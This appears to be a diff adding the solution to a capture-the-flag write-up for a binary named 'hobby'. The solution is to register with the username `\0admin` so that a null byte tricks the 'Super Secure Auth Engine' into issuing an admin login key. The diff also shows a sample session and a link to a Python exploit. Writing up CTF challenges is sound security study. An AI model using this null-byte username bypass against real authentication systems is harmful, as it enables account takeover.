@@ -39,6 +39,28 @@ hobby: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically link
 
 (TODO)
 
-## Other write-ups
+All we have to do to get the flag is register with username `\0admin`.
 
-* none yet
+```bash
+$ python lol.py
+-------------------------------------------------
+|   Welcome to Super Secure Auth Engine |
+-------------------------------------------------
+
+1) Register
+2) Login check
+3) Show my secret
+
+Enjoy ;)
+
+1
+Enter username:
+admin
+
+Your key for login is:
+4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
+```
+
+## Other write-ups and resources
+
+* [Exploit in Python](http://pastebin.com/b2QVFK2U)
